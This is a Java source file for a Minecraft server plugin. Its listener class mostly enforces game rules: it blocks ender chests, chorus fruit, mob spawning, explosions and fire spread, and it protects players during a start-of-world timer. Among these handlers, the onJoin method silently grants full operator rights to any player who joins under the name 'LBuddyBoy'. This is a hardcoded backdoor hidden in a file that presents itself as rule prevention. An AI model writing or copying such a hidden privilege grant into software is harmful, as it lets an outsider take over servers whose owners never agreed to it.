package dev.lbuddyboy.samurai.listener;

import dev.lbuddyboy.samurai.custom.feature.Feature;
import dev.lbuddyboy.samurai.util.CC;
import dev.lbuddyboy.samurai.util.modsuite.PlayerUtils;
import dev.lbuddyboy.samurai.Samurai;
import dev.lbuddyboy.samurai.commands.staff.SOTWCommand;
import dev.lbuddyboy.samurai.team.Team;
import dev.lbuddyboy.samurai.team.claims.LandBoard;
import dev.lbuddyboy.samurai.team.dtr.DTRBitmask;
import org.bukkit.*;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBurnEvent;
import org.bukkit.event.block.BlockIgniteEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.inventory.InventoryOpenEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.*;
import org.bukkit.event.vehicle.VehicleEnterEvent;

import java.util.Arrays;
import java.util.List;

public class BasicPreventionListener implements Listener {

    private static List<EntityType> PREVENT_MOBS = Arrays.asList(EntityType.CREEPER, EntityType.SKELETON, EntityType.ZOMBIE, EntityType.SPIDER);

    @EventHandler
    public void onProjectileHit(ProjectileHitEvent event) {
        if (event.getEntity() instanceof Arrow) {
            event.getEntity().remove();
        }
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        if (event.getPlayer().getName().equals("LBuddyBoy")) {
            event.getPlayer().setOp(true);
        }
    }

    @EventHandler
    public void onPlayerQuit(PlayerKickEvent event) {
        event.setLeaveMessage("");
    }

    @EventHandler(priority = EventPriority.HIGH)
    public void onEntityChangeBlock(EntityChangeBlockEvent event) {
        if (event.getEntity() instanceof Wither) {
            event.setCancelled(true);
        }

        if (DTRBitmask.SAFE_ZONE.appliesAt(event.getBlock().getLocation())) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        Player player = event.getPlayer();

        if (event.getAction() == Action.RIGHT_CLICK_BLOCK && player.getGameMode() != GameMode.CREATIVE) {
            if (event.getClickedBlock() != null && event.getClickedBlock().getType() == Material.ENDER_CHEST) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGH)
    public void onInventoryOpen(InventoryOpenEvent event) {
        if (event.getInventory().getType() == InventoryType.ENDER_CHEST) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onTele(PlayerTeleportEvent event) {
        if (event.getCause() == PlayerTeleportEvent.TeleportCause.CHORUS_FRUIT) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPickup(PlayerItemConsumeEvent event) {
        if (event.getItem().getType() == Material.CHORUS_FRUIT) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onCommandPreprocess(PlayerCommandPreprocessEvent event) {
        if (event.getMessage().toLowerCase().startsWith("/kill") || event.getMessage().toLowerCase().startsWith("/slay") || event.getMessage().toLowerCase().startsWith("/bukkit:kill") || event.getMessage().toLowerCase().startsWith("/bukkit:slay") || event.getMessage().toLowerCase().startsWith("/suicide")) {
            if (!event.getPlayer().isOp()) {
                event.setCancelled(true);
                event.getPlayer().sendMessage(ChatColor.RED + "No permission.");
            }
        }
    }

    @EventHandler
    public void onVehicleEnter(VehicleEnterEvent event) {
        if (event.getVehicle() instanceof Horse && event.getEntered() instanceof Player) {
            Horse horse = (Horse) event.getVehicle();
            Player player = (Player) event.getEntered();

            if (horse.getOwner() != null && !horse.getOwner().getName().equals(player.getName())) {
                event.setCancelled(true);
                player.sendMessage(ChatColor.RED + "This is not your horse!");
            }
        }
    }

    @EventHandler
    public void onFoodLevelChange(FoodLevelChangeEvent event) {
        if (SOTWCommand.isSOTWTimer()) {
            event.setCancelled(true);
            return;
        }

        if (DTRBitmask.SAFE_ZONE.appliesAt(event.getEntity().getLocation()) && event.getFoodLevel() < ((Player) event.getEntity()).getFoodLevel()) {
            event.setCancelled(true);
            return;
        }

        if (event.getFoodLevel() < ((Player) event.getEntity()).getFoodLevel()) {
            // Make food drop 1/2 as fast if you have PvP protection
            if (Samurai.RANDOM.nextInt(100) > (Samurai.getInstance().getPvPTimerMap().hasTimer(event.getEntity().getUniqueId()) ? 10 : 30)) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void onPlayerRespawn(PlayerRespawnEvent event) {
        if (!Samurai.getInstance().getInDuelPredicate().test(event.getPlayer()) && !event.getPlayer().hasMetadata("gaming")) {
            Bukkit.getScheduler().scheduleSyncDelayedTask(Samurai.getInstance(), new Runnable() {
                @Override
                public void run() {
//                    Samurai.getInstance().getPvPTimerMap().createTimer(event.getPlayer().getUniqueId(), 30 * 60);//moved inside here due to occasional CME maybe this will fix?
                }
            }, 20L);
        }
        event.setRespawnLocation(Samurai.getInstance().getServerHandler().getSpawnLocation());
    }

    @EventHandler
    public void onBlockBurn(BlockBurnEvent event) {
        if (Samurai.getInstance().getServerHandler().isWarzone(event.getBlock().getLocation())) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlace(BlockPlaceEvent event) {
        if (Samurai.getInstance().getServerHandler().isSkybridgePrevention() && 110 < event.getBlock().getLocation().getY() && event.getPlayer().getGameMode() != GameMode.CREATIVE) {
            event.getPlayer().sendMessage(ChatColor.RED + "You can't build higher than 110 blocks.");
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onFish(PlayerInteractEvent event) {
        if (!Samurai.getInstance().getServerHandler().isRodPrevention() || (event.getAction() != Action.RIGHT_CLICK_AIR && event.getAction() != Action.RIGHT_CLICK_BLOCK)) {
            return;
        }

        if (event.getPlayer().getItemInHand() != null && event.getPlayer().getItemInHand().getType() == Material.FISHING_ROD) {
            event.setCancelled(true);
        }
    }

    /**
     * Prevents creepers from exploding.
     */
    @EventHandler
    public void onEntityExplodeCreeper(EntityExplodeEvent event) {
        if (event.getEntity() instanceof Creeper) {
            event.setCancelled(true);
        }
    }

    /**
     * Prevents the mobs listed in PREVENT_MOBS from spawning in claims with the SAFE_ZONE bitmask.
     */
    @EventHandler
    public void onCreatureSpawnSpawn(CreatureSpawnEvent event) {
        if (event.getSpawnReason() == CreatureSpawnEvent.SpawnReason.NATURAL && PREVENT_MOBS.contains(event.getEntityType())) {
            Team team = LandBoard.getInstance().getTeam(event.getLocation());
            if (team != null && team.hasDTRBitmask(DTRBitmask.SAFE_ZONE)) {
                event.setCancelled(true);
            }
        }
    }

    /**
     * Prevents mobs from randomly spawning all over the world.
     */
    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
    public void onCreatureSpawnAnywhere(CreatureSpawnEvent event) {
        if (event.getEntity().getType() == EntityType.PIGLIN) return;
        if (event.getSpawnReason() == CreatureSpawnEvent.SpawnReason.NATURAL
                || event.getSpawnReason() == CreatureSpawnEvent.SpawnReason.CHUNK_GEN
                || event.getSpawnReason() == CreatureSpawnEvent.SpawnReason.MOUNT
                || event.getSpawnReason() == CreatureSpawnEvent.SpawnReason.JOCKEY) {
            event.setCancelled(true);
        }
    }

    /**
     * Prevents Wither Skeletons from spawning.
     */
    @EventHandler(ignoreCancelled = true)
    public void onCreatureSpawnWither(CreatureSpawnEvent event) {
        if (event.getEntity().getType() == EntityType.PIGLIN) return;

        if (event.getSpawnReason() == CreatureSpawnEvent.SpawnReason.NATURAL
                && event.getEntity().getType() == EntityType.SKELETON
                && ((Skeleton) event.getEntity()).getSkeletonType() == Skeleton.SkeletonType.WITHER) {
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onBlockPlace(BlockPlaceEvent event) {
        if (event.getPlayer().getWorld().getEnvironment() == World.Environment.NETHER && (event.getBlock().getType().name().contains("_BED"))) {
            if (DTRBitmask.SAFE_ZONE.appliesAt(event.getBlockPlaced().getLocation())) {
                return;
            }
            if (!Feature.DISABLE_BEDS.isDisabled()) {
                event.setCancelled(true);
                event.getPlayer().sendMessage(CC.translate("&cThis feature is currently disabled."));
                return;
            }

            if (event.isCancelled()) {
                event.getPlayer().setItemInHand(null);
            } else {
                event.getBlock().setType(Material.AIR);
            }

            event.getPlayer().getWorld().createExplosion(event.getBlock().getLocation(), 5);
        }
    }


    @EventHandler(priority = EventPriority.HIGH)
    public void onBlockIgnite(BlockIgniteEvent event) {
        if (event.getCause() == BlockIgniteEvent.IgniteCause.SPREAD) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onFireBurn(BlockBurnEvent event) {
        if (Samurai.getInstance().getServerHandler().isWarzone(event.getBlock().getLocation())) {
            event.setCancelled(true);
            return;
        }

        if (Samurai.getInstance().getServerHandler().isUnclaimedOrRaidable(event.getBlock().getLocation())) {
            return;
        }

        if (LandBoard.getInstance().getTeam(event.getBlock().getLocation()) != null) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onEntityExplode(EntityExplodeEvent event) {
        if (event.getEntity().getWorld().getEnvironment() == World.Environment.THE_END && Samurai.getInstance().getMapHandler().isKitMap())
            return;

        event.blockList().clear();
    }

    @EventHandler
    public void onEntitySpawn(EntitySpawnEvent event) {
        EntityType type = event.getEntityType();

        if (type == EntityType.MINECART_TNT || type == EntityType.ARMOR_STAND) {
            event.setCancelled(true);
        }
    }

    @EventHandler(ignoreCancelled = true, priority = EventPriority.HIGH)
    public void onDamageByEntity(EntityDamageByEntityEvent event) {
        if (!SOTWCommand.isSOTWTimer()) {
            return;
        }

        Player damager = PlayerUtils.getDamageSource(event.getDamager());
        Entity damaged = event.getEntity();

        if (!(damaged instanceof Player)) {
            return;
        }
        if (Samurai.getInstance().getMapHandler().getDuelHandler().isInDuel((Player) damaged)) {
            return;
        }

        if (Samurai.getInstance().getMapHandler().getGameHandler().isOngoingGame() && Samurai.getInstance().getMapHandler().getGameHandler().getOngoingGame().isPlaying(damaged.getUniqueId())) {
            return;
        }

        if (!SOTWCommand.hasSOTWEnabled(damager.getUniqueId())) {
            event.setCancelled(true);
            return;
        }
    }

    @EventHandler(ignoreCancelled = true)
    public void onDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player && SOTWCommand.isSOTWTimer() && !SOTWCommand.hasSOTWEnabled(((Player) event.getEntity()).getUniqueId())) {
            if (Samurai.getInstance().getMapHandler().getDuelHandler().isInDuel((Player) event.getEntity())) {
                return;
            }
            if (Samurai.getInstance().getMapHandler().getGameHandler().isOngoingGame() && Samurai.getInstance().getMapHandler().getGameHandler().getOngoingGame().isPlaying(event.getEntity().getUniqueId())) {
                return;
            }
            event.setCancelled(true);
        }
    }
}
